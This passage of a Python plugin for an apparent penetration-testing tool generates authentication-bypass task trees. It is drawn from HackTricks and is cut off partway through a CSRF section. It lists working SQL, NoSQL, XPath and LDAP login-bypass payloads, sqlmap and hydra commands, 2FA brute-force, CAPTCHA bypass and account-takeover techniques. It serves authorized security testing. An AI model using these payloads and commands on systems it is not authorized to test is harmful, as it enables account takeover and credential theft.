"""
Authentication Bypass & Account Takeover Plugin

Generates tasks for authentication bypass testing including:
- Login bypass (SQL, NoSQL, XPath, LDAP injection)
- 2FA/MFA/OTP bypass techniques
- CAPTCHA bypass methods
- Account takeover vectors
- Registration vulnerabilities
- Username enumeration
- Password reset attacks (token leakage, poisoning, IDOR, weak tokens, upsert)
- Rate limit bypass (header manipulation, HTTP/2, GraphQL, proxy rotation)
- Session manipulation

Extracted from HackTricks:
- login-bypass/README.md
- login-bypass/sql-login-bypass.md
- 2fa-bypass.md
- captcha-bypass.md
- account-takeover.md
- registration-vulnerabilities.md
- reset-password.md
- rate-limit-bypass.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class AuthBypassPlugin(ServicePlugin):
    """Authentication bypass and account takeover testing plugin"""

    @property
    def name(self) -> str:
        return "auth-bypass"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any], profile: 'TargetProfile') -> bool:
        """Detect HTTP services for authentication testing"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common HTTP ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate authentication bypass task tree"""

        protocol = 'https' if port in [443, 8443] or 'ssl' in service_info.get('service', '') else 'http'
        base_url = f"{protocol}://{target}:{port}"

        tasks = {
            'id': f'auth-bypass-{port}',
            'name': f'Authentication Bypass Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # Section 1: Login Bypass
        tasks['children'].append(self._create_login_bypass_tasks(base_url, port))

        # Section 2: 2FA/MFA Bypass
        tasks['children'].append(self._create_2fa_bypass_tasks(base_url, port))

        # Section 3: CAPTCHA Bypass
        tasks['children'].append(self._create_captcha_bypass_tasks(base_url, port))

        # Section 4: Account Takeover
        tasks['children'].append(self._create_account_takeover_tasks(base_url, port))

        # Section 5: Registration Vulnerabilities
        tasks['children'].append(self._create_registration_vuln_tasks(base_url, port))

        # Section 6: Password Reset Attacks
        tasks['children'].append(self._create_password_reset_tasks(base_url, port))

        # Section 7: Rate Limit Bypass
        tasks['children'].append(self._create_rate_limit_bypass_tasks(base_url, port))

        return tasks

    def _create_login_bypass_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create login bypass enumeration tasks"""
        return {
            'id': f'login-bypass-{port}',
            'name': 'Login Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'login-sql-injection-{port}',
                    'name': 'SQL Injection Login Bypass',
                    'type': 'command',
                    'metadata': {
                        'command': f'sqlmap -u "{base_url}/login" --data="username=admin&password=test" --level=5 --risk=3 --batch',
                        'description': 'Test login form for SQL injection bypass vulnerabilities',
                        'tags': ['OSCP:HIGH', 'AUTOMATED', 'NOISY'],
                        'flag_explanations': {
                            '-u': 'Target URL with login endpoint',
                            '--data': 'POST data parameters (username/password)',
                            '--level=5': 'Maximum test level (comprehensive)',
                            '--risk=3': 'Maximum risk level (aggressive tests)',
                            '--batch': 'Non-interactive mode'
                        },
                        'success_indicators': [
                            'SQL injection found in username/password field',
                            'Boolean-based blind SQLi detected',
                            'Authentication bypass successful'
                        ],
                        'failure_indicators': [
                            'All tested parameters appear to be not injectable',
                            'WAF/IPS detected',
                            'Connection timeout'
                        ],
                        'next_steps': [
                            'If SQLi found, test payloads: admin\' or 1=1--',
                            'Try NoSQL injection if SQL fails',
                            'Document exact payload that bypassed authentication',
                            'Capture authenticated session cookie'
                        ],
                        'alternatives': [
                            'Manual: Send POST with username=admin\' or 1=1-- &password=any',
                            'Manual: Try username=admin\'-- &password=',
                            'Burp Intruder with sql-login-bypass.txt wordlist',
                            'curl -X POST {base_url}/login -d "username=admin\' or 1=1--&password=test"'
                        ],
                        'notes': 'Common SQL bypass payloads: admin\' or 1=1--, admin\'-- , \' or \'1\'=\'1, " or "1"="1'
                    }
                },
                {
                    'id': f'login-nosql-injection-{port}',
                    'name': 'NoSQL Injection Login Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for NoSQL injection (MongoDB, CouchDB) authentication bypass',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: POST {"username": {"$ne": null}, "password": {"$ne": null}}',
                            'Manual: POST {"username": {"$gt": ""}, "password": {"$gt": ""}}',
                            'Manual: POST username[$ne]=admin&password[$ne]=pass',
                            'Manual: POST username=admin&password[$regex]=.*',
                            'Burp: Change Content-Type to application/json'
                        ],
                        'success_indicators': [
                            'Login successful without valid credentials',
                            'Different response when using $ne operator',
                            'User enumeration via boolean response'
                        ],
                        'failure_indicators': [
                            'Syntax error (application may not use NoSQL)',
                            'Same response regardless of payload',
                            'Input sanitization blocking operators'
                        ],
                        'next_steps': [
                            'If bypass works, document exact JSON payload',
                            'Attempt to extract usernames via blind NoSQL injection',
                            'Try password[$regex]=^a to brute-force passwords character by character'
                        ],
                        'notes': 'NoSQL bypass requires JSON body. Change Content-Type: application/json. Test with known username if possible.'
                    }
                },
                {
                    'id': f'login-xpath-injection-{port}',
                    'name': 'XPath Injection Login Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for XPath injection in XML-based authentication',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: username=\' or \'1\'=\'1 &password=any',
                            'Manual: username=\' or 1]%00 &password=any',
                            'Manual: username=admin\' or \' &password=',
                            'Manual: username=\'or string-length(name(.))<10 or\' &password=',
                            'Burp Intruder with XPath bypass payloads'
                        ],
                        'success_indicators': [
                            'Authentication bypass with XPath payload',
                            'Different error messages reveal XPath parsing',
                            'Boolean-based bypass successful'
                        ],
                        'failure_indicators': [
                            'Same response regardless of XPath syntax',
                            'Application does not use XML backend',
                            'Input filtering blocks XPath metacharacters'
                        ],
                        'next_steps': [
                            'If bypass successful, try to enumerate XML structure',
                            'Test for blind XPath injection',
                            'Document working payload for report'
                        ],
                        'notes': 'XPath used in older applications with XML backends. Less common than SQL/NoSQL but high impact when found.'
                    }
                },
                {
                    'id': f'login-ldap-injection-{port}',
                    'name': 'LDAP Injection Login Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for LDAP injection in Active Directory/LDAP authentication',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: username=* &password=*',
                            'Manual: username=*)(&password=pwd',
                            'Manual: username=admin)(|(&password=any',
                            'Manual: username=admin)(&) &password=pwd',
                            'Manual: username=*)(|(*&password=*))%00',
                            'Burp Intruder with LDAP bypass list'
                        ],
                        'success_indicators': [
                            'Authentication bypass with LDAP wildcard (*)',
                            'Login as first user in directory',
                            'LDAP error messages exposed'
                        ],
                        'failure_indicators': [
                            'LDAP characters filtered/escaped',
                            'Application does not use LDAP backend',
                            'Same response for all payloads'
                        ],
                        'next_steps': [
                            'If bypass works, try to enumerate users: username=a*',
                            'Attempt to login as specific users: username=admin*',
                            'Document LDAP query structure if error reveals it'
                        ],
                        'notes': 'LDAP injection common in enterprise apps with AD authentication. Wildcard (*) often bypasses filters.'
                    }
                },
                {
                    'id': f'login-logic-flaws-{port}',
                    'name': 'Login Logic Flaw Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for authentication bypass via parameter manipulation and logic flaws',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            'Manual: Send only username parameter (omit password)',
                            'Manual: Send empty password: username=admin&password=',
                            'Manual: Array injection: user[]=admin&pwd[]=test',
                            'Manual: JSON boolean: {"username":"admin","password":true}',
                            'Manual: NodeJS bypass: password[password]=1',
                            'Manual: Check source code comments for credentials',
                            'Manual: Test default credentials: admin/admin, root/root',
                            'Manual: Change POST to GET method',
                            'Manual: Change Content-Type from form to JSON'
                        ],
                        'success_indicators': [
                            'Login successful without valid password',
                            'Different response when omitting parameters',
                            'Boolean true accepted as valid password',
                            'Default credentials work'
                        ],
                        'failure_indicators': [
                            'Required field validation prevents bypass',
                            'Same error for all logic flaw attempts',
                            'Strong input validation present'
                        ],
                        'next_steps': [
                            'If bypass found, document exact parameter manipulation',
                            'Test on multiple accounts to confirm',
                            'Check if session cookies are properly generated',
                            'Attempt privilege escalation post-bypass'
                        ],
                        'notes': 'PHP comparison errors (user[]=a), NodeJS password[password]=1, JSON boolean bypass common. Check comments in HTML source!'
                    }
                },
                {
                    'id': f'login-direct-access-{port}',
                    'name': 'Direct Page Access Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Attempt to access authenticated pages directly without login',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            f'Manual: curl {base_url}/admin',
                            f'Manual: curl {base_url}/dashboard',
                            f'Manual: curl {base_url}/account',
                            f'Manual: curl {base_url}/profile',
                            'Manual: Modify Referer header to mimic authenticated request',
                            'Burp: Send GET /admin with Referer: /login',
                            'Browser: Type admin URL directly in address bar'
                        ],
                        'success_indicators': [
                            'Admin panel accessible without authentication',
                            'Dashboard loads without session cookie',
                            'Different response than 401/403'
                        ],
                        'failure_indicators': [
                            '401 Unauthorized response',
                            '403 Forbidden response',
                            'Redirect to login page',
                            'Proper session validation present'
                        ],
                        'next_steps': [
                            'If accessible, enumerate all admin functions',
                            'Test for IDOR on user-specific pages',
                            'Document broken access control',
                            'Check for privilege escalation'
                        ],
                        'notes': 'Weak session validation may allow direct access. Test common paths: /admin, /dashboard, /api/users. Time estimate: 2-3 minutes'
                    }
                },
                {
                    'id': f'login-username-enum-{port}',
                    'name': 'Username Enumeration',
                    'type': 'command',
                    'metadata': {
                        'command': f'hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p test {base_url.split("://")[1].split(":")[0]} http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V',
                        'description': 'Enumerate valid usernames via response timing/message differences',
                        'tags': ['OSCP:MEDIUM', 'ENUM', 'NOISY'],
                        'flag_explanations': {
                            '-L': 'Username wordlist (test common names first)',
                            '-p test': 'Use single test password for all usernames',
                            'http-post-form': 'HTTP POST method for form submission',
                            '^USER^': 'Username placeholder',
                            '^PASS^': 'Password placeholder',
                            'F=incorrect': 'Failure string to detect in response',
                            '-V': 'Verbose output to see each attempt'
                        },
                        'success_indicators': [
                            'Different response time for valid usernames',
                            'Different error message: "Invalid password" vs "User not found"',
                            'Valid usernames discovered'
                        ],
                        'failure_indicators': [
                            'Same response for all usernames',
                            'Rate limiting triggered',
                            'Account lockout after attempts'
                        ],
                        'next_steps': [
                            'Save discovered usernames for password attacks',
                            'Test discovered users for default passwords',
                            'Check if usernames are email addresses',
                            'Try password spray with common passwords'
                        ],
                        'alternatives': [
                            'Manual: Compare response for admin vs randomuser',
                            'Manual: Measure response time differences',
                            'Burp Intruder: Cluster bomb attack to identify patterns',
                            'ffuf -w users.txt -u {base_url}/login -X POST -d "username=FUZZ&password=test" -mc 200'
                        ],
                        'notes': 'Username enumeration critical for brute-force. Look for timing differences, different errors, or different response sizes.'
                    }
                }
            ]
        }

    def _create_2fa_bypass_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create 2FA/MFA bypass tasks"""
        return {
            'id': f'2fa-bypass-{port}',
            'name': '2FA/MFA/OTP Bypass Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'2fa-direct-access-{port}',
                    'name': '2FA Direct Endpoint Access',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Attempt to access post-2FA pages directly without completing verification',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login with valid credentials, stop before 2FA',
                            'Manual: Access /dashboard or /account directly',
                            'Manual: Modify Referer header to /2fa-verify',
                            'Burp: Intercept and modify session cookie',
                            'Burp: Forward first login request, skip 2FA endpoint'
                        ],
                        'success_indicators': [
                            'Authenticated pages accessible without 2FA',
                            'Session created before 2FA completion',
                            'Dashboard loads without OTP verification'
                        ],
                        'failure_indicators': [
                            'Redirect back to 2FA page',
                            'Session not created until 2FA complete',
                            'Access denied without 2FA token'
                        ],
                        'next_steps': [
                            'If bypass works, document exact URL accessed',
                            'Test on multiple accounts',
                            'Check if session persistence allows re-use',
                            'Verify full application access granted'
                        ],
                        'notes': 'Most common 2FA bypass. Test immediately after password authentication. Time: 2-3 minutes.'
                    }
                },
                {
                    'id': f'2fa-token-reuse-{port}',
                    'name': '2FA Token Reuse Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if previously used 2FA tokens can be reused for authentication',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login, complete 2FA, save token',
                            'Manual: Logout and login again',
                            'Manual: Submit old token for new session',
                            'Burp: Replay 2FA verification request with old token',
                            'Check if tokens expire or are single-use'
                        ],
                        'success_indicators': [
                            'Old token still valid after use',
                            'Token works across multiple sessions',
                            'No token expiration implemented'
                        ],
                        'failure_indicators': [
                            'Token invalidated after first use',
                            'Token expired error',
                            'Single-use token enforcement'
                        ],
                        'next_steps': [
                            'If reusable, test token lifetime',
                            'Attempt to use token from different account',
                            'Document token format and generation'
                        ],
                        'notes': 'Tokens should be single-use and expire quickly. Reuse indicates weak implementation.'
                    }
                },
                {
                    'id': f'2fa-token-exposure-{port}',
                    'name': '2FA Token Exposure Check',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check if 2FA token is exposed in responses, source code, or cookies',
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'alternatives': [
                            'Manual: Inspect page source after 2FA request',
                            'Manual: Check response JSON for token field',
                            'Manual: Examine cookies for OTP value',
                            'Manual: Check JavaScript variables',
                            'Burp: Review all responses for token patterns',
                            'Browser DevTools: Search for "token", "otp", "code"'
                        ],
                        'success_indicators': [
                            'Token visible in HTML source',
                            'Token in JSON response body',
                            'Token stored in client-side cookie',
                            'Token in JavaScript variable'
                        ],
                        'failure_indicators': [
                            'No token found in responses',
                            'Token only delivered via SMS/Email',
                            'Proper token handling observed'
                        ],
                        'next_steps': [
                            'If exposed, extract and use token to bypass 2FA',
                            'Document exact location of exposure',
                            'Test if token changes on refresh',
                            'Check for predictable token generation'
                        ],
                        'notes': 'Critical vulnerability if token exposed. Check response body, cookies, HTML source. Time: 5 minutes.'
                    }
                },
                {
                    'id': f'2fa-brute-force-{port}',
                    'name': '2FA Code Brute Force',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Attempt to brute-force 2FA codes (typically 4-6 digits)',
                        'tags': ['OSCP:MEDIUM', 'NOISY', 'MANUAL'],
                        'alternatives': [
                            'Manual: Test for rate limiting - send 20+ requests',
                            'Burp Intruder: Numeric payload 000000-999999',
                            'Manual: Check if code resend resets rate limit',
                            'Manual: Test with small token space (0000-9999)',
                            'Python script: for code in range(10000): test(code)'
                        ],
                        'success_indicators': [
                            'No rate limiting detected',
                            'Different response when correct code sent',
                            'Successful authentication via brute force',
                            'Code resend resets attempt counter'
                        ],
                        'failure_indicators': [
                            'Account locked after N attempts',
                            'Rate limiting enforced',
                            'IP blocked after attempts',
                            'Strong lockout mechanism'
                        ],
                        'next_steps': [
                            'If no rate limit, calculate attack time: 10k codes * 1sec = 2.7 hours',
                            'Test if multiple sessions allow parallel brute force',
                            'Document rate limit bypass techniques',
                            'Check for response differences on valid code'
                        ],
                        'notes': '4-digit PIN = 10,000 attempts. 6-digit = 1,000,000. Viable only without rate limiting. Check for silent rate limiting too!'
                    }
                },
                {
                    'id': f'2fa-session-manipulation-{port}',
                    'name': '2FA Session Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for 2FA bypass via session fixation or manipulation',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login to attacker account, complete 2FA',
                            'Manual: In parallel session, login to victim account (stop at 2FA)',
                            'Manual: Use attacker\'s verified session to access victim account',
                            'Burp: Swap session cookies between accounts',
                            'Test if 2FA verification is tied to session vs user'
                        ],
                        'success_indicators': [
                            'Attacker 2FA verification unlocks victim account',
                            'Session fixation allows 2FA bypass',
                            'Backend does not correlate user to 2FA session'
                        ],
                        'failure_indicators': [
                            'Session tied to specific user',
                            'Separate 2FA verification per account',
                            'Strong session management'
                        ],
                        'next_steps': [
                            'If vulnerable, document session flow',
                            'Test with multiple users',
                            'Check for race conditions in verification',
                            'Attempt privilege escalation'
                        ],
                        'notes': 'Complex attack requiring two simultaneous sessions. Backend may not validate which user completed 2FA.'
                    }
                },
                {
                    'id': f'2fa-password-reset-{port}',
                    'name': '2FA Password Reset Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if password reset flow bypasses 2FA requirement',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Create account, enable 2FA',
                            'Manual: Request password reset',
                            'Manual: Complete reset, login with new password',
                            'Manual: Check if 2FA is bypassed after reset',
                            'Test if reset disables 2FA temporarily/permanently'
                        ],
                        'success_indicators': [
                            'Login successful without 2FA after reset',
                            '2FA disabled during/after password reset',
                            'Access granted without OTP verification'
                        ],
                        'failure_indicators': [
                            '2FA still required after password reset',
                            'Backup codes required for reset',
                            'Proper 2FA persistence'
                        ],
                        'next_steps': [
                            'If bypass works, document reset flow',
                            'Test if 2FA re-enables automatically',
                            'Check if attacker can trigger victim reset',
                            'Combine with password reset vulnerabilities'
                        ],
                        'notes': 'Common design flaw. Password reset may clear 2FA to allow account recovery. Check multiple reset paths (email, SMS, security questions).'
                    }
                },
                {
                    'id': f'2fa-remember-me-{port}',
                    'name': '2FA Remember Me Exploitation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if "Remember Me" or "Trust this device" can be exploited',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Enable "Remember this device" option',
                            'Manual: Check cookie for predictable values',
                            'Manual: Test if cookie works from different IP',
                            'Manual: Attempt to guess/brute force cookie value',
                            'Burp: Modify X-Forwarded-For to victim IP',
                            'Test cookie expiration and validation'
                        ],
                        'success_indicators': [
                            'Predictable "remember me" cookie value',
                            'Cookie works from any IP address',
                            'Cookie never expires',
                            'No device fingerprinting'
                        ],
                        'failure_indicators': [
                            'Cryptographically strong cookie',
                            'IP address validation enforced',
                            'Device fingerprinting prevents bypass',
                            'Cookie expires after reasonable time'
                        ],
                        'next_steps': [
                            'If weak cookie, attempt to forge value',
                            'Test IP spoofing via X-Forwarded-For',
                            'Document cookie structure',
                            'Check for cookie theft via XSS'
                        ],
                        'notes': 'Weak "remember me" implementations can bypass 2FA permanently. Check for MD5/predictable tokens.'
                    }
                },
                {
                    'id': f'2fa-api-version-{port}',
                    'name': '2FA API Version Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test older API versions or subdomains for missing 2FA',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Test /api/v1/ vs /api/v2/ endpoints',
                            'Manual: Check mobile API paths',
                            'Manual: Test subdomains: m.site.com, mobile.site.com',
                            'Manual: Review JavaScript for legacy endpoints',
                            'Manual: Check for /api/legacy/ or /v1/ paths',
                            'ffuf to enumerate API versions'
                        ],
                        'success_indicators': [
                            'Older API version lacks 2FA',
                            'Subdomain has weaker authentication',
                            'Mobile endpoints skip 2FA',
                            'Legacy paths bypass security'
                        ],
                        'failure_indicators': [
                            'Consistent 2FA across all versions',
                            'Old endpoints deprecated/disabled',
                            'Uniform security policy'
                        ],
                        'next_steps': [
                            'If found, document exact vulnerable endpoint',
                            'Test full functionality via legacy API',
                            'Check for other security differences',
                            'Map all API versions'
                        ],
                        'notes': 'Older APIs may predate 2FA implementation. Check /v1/, /api/v1/, mobile.*, m.*, legacy.* paths.'
                    }
                }
            ]
        }

    def _create_captcha_bypass_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create CAPTCHA bypass testing tasks"""
        return {
            'id': f'captcha-bypass-{port}',
            'name': 'CAPTCHA Bypass Testing',
            'type': 'parent',
            'children': [
                {
                    'id': f'captcha-parameter-manip-{port}',
                    'name': 'CAPTCHA Parameter Manipulation',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test CAPTCHA bypass via parameter removal or modification',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            'Manual: Submit form without captcha parameter',
                            'Manual: Send empty captcha value: captcha=',
                            'Manual: Change POST to GET method',
                            'Manual: Change form data to JSON',
                            'Burp: Remove captcha parameter entirely',
                            'Burp: Send captcha=null or captcha=undefined'
                        ],
                        'success_indicators': [
                            'Form submission successful without CAPTCHA',
                            'Empty CAPTCHA value accepted',
                            'Method change bypasses validation',
                            'Server does not enforce CAPTCHA'
                        ],
                        'failure_indicators': [
                            'Required field validation',
                            'CAPTCHA verification enforced',
                            'Error: Invalid CAPTCHA'
                        ],
                        'next_steps': [
                            'If bypass works, document exact method',
                            'Test automation of form submission',
                            'Check for rate limiting without CAPTCHA',
                            'Combine with brute force attacks'
                        ],
                        'notes': 'Easiest CAPTCHA bypass. Try omitting parameter first. Time: 2-3 minutes. High impact for brute force!'
                    }
                },
                {
                    'id': f'captcha-reuse-{port}',
                    'name': 'CAPTCHA Value Reuse',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if CAPTCHA values can be reused across sessions',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Solve CAPTCHA once, save value',
                            'Manual: Reuse same value in multiple requests',
                            'Manual: Test if value works in different session',
                            'Manual: Check cookie for CAPTCHA value',
                            'Burp: Replay request with old CAPTCHA',
                            'Test CAPTCHA expiration time'
                        ],
                        'success_indicators': [
                            'Old CAPTCHA value still valid',
                            'Same value works across sessions',
                            'No expiration enforced',
                            'Value found in cookies/source'
                        ],
                        'failure_indicators': [
                            'CAPTCHA invalidated after use',
                            'Each request requires new CAPTCHA',
                            'Session-bound verification'
                        ],
                        'next_steps': [
                            'If reusable, automate with single solution',
                            'Test lifetime of CAPTCHA value',
                            'Document cookie/parameter name',
                            'Check for predictable values'
                        ],
                        'notes': 'CAPTCHAs should be single-use. Reuse allows automation. Check cookies for exposed values!'
                    }
                },
                {
                    'id': f'captcha-ocr-bypass-{port}',
                    'name': 'CAPTCHA OCR/Image Recognition',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Attempt to solve CAPTCHA using OCR tools',
                        'tags': ['OSCP:LOW', 'MANUAL'],
                        'alternatives': [
                            'Manual: Download CAPTCHA images',
                            'tesseract image.png output (OCR)',
                            'Python: pytesseract for automation',
                            'Check if image set is limited (MD5 hash catalog)',
                            'Manual: Solve math CAPTCHA programmatically',
                            'Third-party: 2captcha.com API (not for OSCP exam)'
                        ],
                        'success_indicators': [
                            'OCR successfully reads text',
                            'Limited image set allows pre-solving',
                            'Math CAPTCHA easily automated',
                            'Low complexity allows recognition'
                        ],
                        'failure_indicators': [
                            'Complex CAPTCHA defeats OCR',
                            'reCAPTCHA or hCaptcha used',
                            'Distortion prevents recognition',
                            'Large unique image set'
                        ],
                        'next_steps': [
                            'If OCR works, build automation script',
                            'Test accuracy rate of OCR',
                            'Combine with brute force workflow',
                            'Document CAPTCHA complexity'
                        ],
                        'notes': 'Simple CAPTCHAs vulnerable to tesseract OCR. Complex ones (reCAPTCHA) require different approach. Math CAPTCHAs trivial to automate.'
                    }
                },
                {
                    'id': f'captcha-source-exposure-{port}',
                    'name': 'CAPTCHA Source Code Exposure',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Check if CAPTCHA answer is exposed in page source or responses',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'MANUAL'],
                        'alternatives': [
                            'Manual: View page source, search for "captcha"',
                            'Manual: Check JavaScript variables',
                            'Manual: Inspect cookies for answer',
                            'Manual: Check image URL for embedded answer',
                            'Burp: Review all responses for CAPTCHA data',
                            'Browser DevTools: Search for solution value'
                        ],
                        'success_indicators': [
                            'CAPTCHA answer in HTML comment',
                            'Answer in JavaScript variable',
                            'Answer in cookie value',
                            'Answer in image filename/URL'
                        ],
                        'failure_indicators': [
                            'No answer exposed client-side',
                            'Server-side validation only',
                            'Proper implementation'
                        ],
                        'next_steps': [
                            'If exposed, extract and automate',
                            'Document exact location',
                            'Build script to parse answer',
                            'Test automation feasibility'
                        ],
                        'notes': 'Critical flaw if answer exposed. Check source, JS, cookies. Common in custom CAPTCHA implementations. Time: 5 minutes.'
                    }
                },
                {
                    'id': f'captcha-rate-limit-{port}',
                    'name': 'CAPTCHA Rate Limit Testing',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if CAPTCHA can be bypassed via session/IP rotation',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Test X-Forwarded-For header rotation',
                            'Manual: Rotate User-Agent strings',
                            'Manual: Create new sessions rapidly',
                            'Manual: Test if rate limit is IP-based vs session-based',
                            'Burp: Inject X-Forwarded-For: 10.0.0.X',
                            'Test CAPTCHA trigger threshold'
                        ],
                        'success_indicators': [
                            'CAPTCHA bypassed with header manipulation',
                            'Rate limit reset via IP rotation',
                            'Session rotation avoids CAPTCHA',
                            'No global rate limiting'
                        ],
                        'failure_indicators': [
                            'CAPTCHA always required',
                            'Strong rate limiting',
                            'IP spoofing blocked',
                            'Account-based limits'
                        ],
                        'next_steps': [
                            'If bypass works, automate rotation',
                            'Test attack scalability',
                            'Document evasion technique',
                            'Combine with brute force'
                        ],
                        'notes': 'CAPTCHA often triggered by rate limit. Test if limit can be evaded. X-Forwarded-For, User-Agent, session rotation common bypasses.'
                    }
                }
            ]
        }

    def _create_account_takeover_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create account takeover vulnerability tasks"""
        return {
            'id': f'account-takeover-{port}',
            'name': 'Account Takeover Techniques',
            'type': 'parent',
            'children': [
                {
                    'id': f'ato-email-change-{port}',
                    'name': 'Email Change Authorization Test',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for weak email change confirmation (account takeover vector)',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Login to attacker account',
                            'Manual: Request to change email to victim@test.com',
                            'Manual: Intercept confirmation request',
                            'Manual: Check if confirmation link is attacker-controlled',
                            'Manual: Send victim the confirmation link',
                            'Burp: Analyze email change flow for flaws'
                        ],
                        'success_indicators': [
                            'Email changed without victim verification',
                            'Attacker can trigger victim email change',
                            'Weak confirmation mechanism',
                            'No email ownership verification'
                        ],
                        'failure_indicators': [
                            'Confirmation sent to new email (victim)',
                            'Old email must approve change',
                            'Strong two-step verification'
                        ],
                        'next_steps': [
                            'If vulnerable, change victim email to attacker',
                            'Use password reset on changed email',
                            'Complete account takeover',
                            'Document exact flow'
                        ],
                        'notes': 'Critical ATO vector. If attacker can change victim email without verification, password reset = full takeover.'
                    }
                },
                {
                    'id': f'ato-unicode-normalization-{port}',
                    'name': 'Unicode Normalization Account Takeover',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for account takeover via unicode character normalization',
                        'tags': ['OSCP:MEDIUM', 'MANUAL'],
                        'alternatives': [
                            'Manual: Create account with unicode email: vićtim@company.com',
                            'Manual: System may normalize to victim@company.com',
                            'Manual: Login via OAuth with unicode email',
                            'Manual: Test if normalized to existing account',
                            'Manual: Try unicode in username field',
                            'Manual: Test domain part: victim@ćompany.com'
                        ],
                        'success_indicators': [
                            'Unicode email normalized to victim account',
                            'Access granted to existing account',
                            'Unicode bypass email verification',
                            'Third-party OAuth with unicode accepted'
                        ],
                        'failure_indicators': [
                            'Unicode rejected',
                            'No normalization occurs',
                            'Email verification enforced',
                            'Separate accounts created'
                        ],
                        'next_steps': [
                            'If successful, document unicode character used',
                            'Test multiple normalization forms (NFC, NFD)',
                            'Attempt with third-party OAuth',
                            'Check for privilege escalation'
                        ],
                        'notes': 'Advanced attack. Unicode ć normalizes to c. Create vićtim@site.com → normalized to victim@site.com = access to real account!'
                    }
                },
                {
                    'id': f'ato-cors-exploitation-{port}',
                    'name': 'CORS Misconfiguration ATO',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for CORS misconfiguration allowing sensitive data theft',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Check for Access-Control-Allow-Origin: *',
                            'Manual: Test if Origin header reflected',
                            'Manual: Craft CORS exploit to steal auth tokens',
                            'Manual: Check /api/ endpoints for CORS headers',
                            'Burp: Add Origin: https://attacker.com to requests',
                            'Verify Access-Control-Allow-Credentials: true'
                        ],
                        'success_indicators': [
                            'CORS allows arbitrary origins',
                            'Credentials allowed with wildcard origin',
                            'Sensitive endpoints exposed via CORS',
                            'Can steal session tokens'
                        ],
                        'failure_indicators': [
                            'Whitelist of allowed origins',
                            'No credentials with wildcard',
                            'Proper CORS policy'
                        ],
                        'next_steps': [
                            'If vulnerable, create CORS exploit page',
                            'Extract authentication tokens',
                            'Test for account takeover',
                            'Document misconfigured endpoints'
                        ],
                        'notes': 'CORS with credentials allows cross-origin data theft. Check API endpoints. Origin: https://attacker.com should be rejected!'
                    }
                },
                {
                    'id': f'ato-csrf-{port}',
                    'name': 'CSRF Account Takeover',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test for CSRF allowing attacker to change victim authentication',
                        'tags': ['OSCP:HIGH', 'MANUAL'],
                        'alternatives': [
                            'Manual: Check if password change has CSRF token',
                            'Manual: Check if email change has CSRF token',
                            'Manual: Create CSRF PoC for password change',
                            'Manual: Test SameSite cookie attribute',
